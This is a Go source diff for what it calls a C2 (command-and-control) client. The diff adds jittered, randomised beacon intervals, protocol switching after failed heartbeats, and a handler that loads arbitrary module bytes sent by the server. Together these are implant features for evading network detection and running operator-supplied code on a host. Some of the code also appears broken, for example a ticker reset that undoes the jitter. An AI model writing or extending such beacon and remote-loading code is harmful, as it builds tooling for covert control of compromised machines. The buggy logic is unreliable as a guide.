@@ -3,6 +3,8 @@ package client
 import (
     "context"
     "encoding/json"
+    "fmt"
+    "math/rand"
     "sync"
     "time"
 
@@ -30,14 +32,20 @@ type Config struct {
 
 // Client represents a C2 client
 type Client struct {
-    config        Config
-    protocolMgr   *protocol.ProtocolManager
-    moduleMgr     *module.ModuleManager
-    ctx           context.Context
-    cancel        context.CancelFunc
-    wg            sync.WaitGroup
-    heartbeatTick *time.Ticker
-    mu            sync.RWMutex
+    config                Config
+    protocolMgr           *protocol.ProtocolManager
+    moduleMgr             *module.ModuleManager
+    ctx                   context.Context
+    cancel                context.CancelFunc
+    wg                    sync.WaitGroup
+    heartbeatTick         *time.Ticker
+    mu                    sync.RWMutex
+    randomHeartbeatEnabled bool
+    minHeartbeatInterval  time.Duration
+    maxHeartbeatInterval  time.Duration
+    lastHeartbeatTime     time.Time
+    heartbeatFailCount    int
+    heartbeatTimeout      time.Duration
 }
 
 // NewClient creates a new client
@@ -74,12 +82,18 @@ func NewClient(config Config) (*Client, error) {
     ctx, cancel := context.WithCancel(context.Background())
     
     return &Client{
-        config:        config,
-        protocolMgr:   protocol.NewProtocolManager(protocols, config.ProtocolSwitchThreshold),
-        moduleMgr:     module.NewModuleManager(),
-        ctx:           ctx,
-        cancel:        cancel,
-        heartbeatTick: time.NewTicker(config.HeartbeatInterval),
+        config:                config,
+        protocolMgr:           protocol.NewProtocolManager(protocols, config.ProtocolSwitchThreshold),
+        moduleMgr:             module.NewModuleManager(),
+        ctx:                   ctx,
+        cancel:                cancel,
+        heartbeatTick:         time.NewTicker(config.HeartbeatInterval),
+        randomHeartbeatEnabled: false,
+        minHeartbeatInterval:  1 * time.Second,
+        maxHeartbeatInterval:  24 * time.Hour,
+        heartbeatTimeout:      30 * time.Second,
+        heartbeatFailCount:    0,
+        lastHeartbeatTime:     time.Now(),
     }, nil
 }
 
@@ -118,29 +132,64 @@ func (c *Client) heartbeatLoop() {
         case <-c.ctx.Done():
             return
         case <-c.heartbeatTick.C:
-            c.sendHeartbeat()
+            c.mu.Lock()
+            c.lastHeartbeatTime = time.Now()
+            c.mu.Unlock()
+            
+            err := c.sendHeartbeat()
+            if err != nil {
+                c.mu.Lock()
+                c.heartbeatFailCount++
+                
+                // If we've failed too many times, try switching protocols
+                if c.heartbeatFailCount >= c.config.ProtocolSwitchThreshold {
+                    // The protocol manager will handle the actual switching
+                    c.heartbeatFailCount = 0
+                }
+                
+                c.mu.Unlock()
+            } else {
+                c.mu.Lock()
+                c.heartbeatFailCount = 0
+                
+                // If random heartbeats are enabled, update the interval
+                if c.randomHeartbeatEnabled {
+                    c.updateHeartbeatInterval()
+                }
+                
+                c.mu.Unlock()
+            }
         }
     }
 }
 
 // sendHeartbeat sends a heartbeat to the server
-func (c *Client) sendHeartbeat() {
+func (c *Client) sendHeartbeat() error {
+    c.mu.RLock()
+    randomEnabled := c.randomHeartbeatEnabled
+    interval := c.config.HeartbeatInterval
+    if c.heartbeatTick != nil {
+        // Reset the ticker with the current interval
+        c.heartbeatTick.Reset(interval)
+    }
+    c.mu.RUnlock()
+    
     heartbeat := map[string]interface{}{
-        "type":      "heartbeat",
-        "client_id": c.config.ID,
-        "timestamp": time.Now().Unix(),
+        "type":           "heartbeat",
+        "client_id":      c.config.ID,
+        "timestamp":      time.Now().Unix(),
+        "random_enabled": randomEnabled,
+        "interval":       interval.Milliseconds(),
+        "protocol":       c.protocolMgr.GetCurrentProtocol().GetName(),
     }
     
     data, err := json.Marshal(heartbeat)
     if err != nil {
         // Log error
-        return
+        return err
     }
     
-    err = c.protocolMgr.Send(data)
-    if err != nil {
-        // Log error
-    }
+    return c.protocolMgr.Send(data)
 }
 
 // commandLoop receives and processes commands from the server
@@ -219,15 +268,29 @@ func (c *Client) handleExecuteModule(moduleName string, params json.RawMessage) 
 
 // handleLoadModule handles the load_module command
 func (c *Client) handleLoadModule(moduleName string, params json.RawMessage) {
-    // This is a placeholder for module loading logic
-    // In a real implementation, this would dynamically load a module based on the module name
+    var moduleData struct {
+        ModuleBytes []byte `json:"module_bytes"`
+    }
+    
+    err := json.Unmarshal(params, &moduleData)
     
     response := map[string]interface{}{
         "type":      "module_load_result",
         "client_id": c.config.ID,
         "module":    moduleName,
         "success":   false,
-        "error":     "Dynamic module loading not implemented",
+    }
+    
+    if err != nil {
+        response["error"] = fmt.Sprintf("Failed to parse module data: %v", err)
+    } else {
+        // Load the module
+        err = c.moduleMgr.LoadModuleFromBytes(moduleName, moduleData.ModuleBytes)
+        if err != nil {
+            response["error"] = fmt.Sprintf("Failed to load module: %v", err)
+        } else {
+            response["success"] = true
+        }
     }
     
     data, err := json.Marshal(response)
@@ -267,6 +330,50 @@ func (c *Client) handleUnloadModule(moduleName string) {
     if err != nil {
         // Log error
     }
+}
+
+// EnableRandomHeartbeat enables random heartbeat intervals
+func (c *Client) EnableRandomHeartbeat(min, max time.Duration) {
+    c.mu.Lock()
+    defer c.mu.Unlock()
+    
+    c.randomHeartbeatEnabled = true
+    c.minHeartbeatInterval = min
+    c.maxHeartbeatInterval = max
+    
+    // Generate a new random interval immediately
+    c.updateHeartbeatInterval()
+}
+
+// DisableRandomHeartbeat disables random heartbeat intervals
+func (c *Client) DisableRandomHeartbeat() {
+    c.mu.Lock()
+    defer c.mu.Unlock()
+    
+    c.randomHeartbeatEnabled = false
+    
+    // Reset to the configured interval
+    if c.heartbeatTick != nil {
+        c.heartbeatTick.Stop()
+    }
+    c.heartbeatTick = time.NewTicker(c.config.HeartbeatInterval)
+}
+
+// updateHeartbeatInterval generates a new random heartbeat interval
+func (c *Client) updateHeartbeatInterval() {
+    if !c.randomHeartbeatEnabled {
+        return
+    }
+    
+    // Generate a random duration between min and max
+    randomDuration := c.minHeartbeatInterval +
+        time.Duration(rand.Int63n(int64(c.maxHeartbeatInterval-c.minHeartbeatInterval)))
+    
+    // Update the ticker
+    if c.heartbeatTick != nil {
+        c.heartbeatTick.Stop()
+    }
+    c.heartbeatTick = time.NewTicker(randomDuration)
 }
 
 // GetSupportedModules returns a list of supported modules
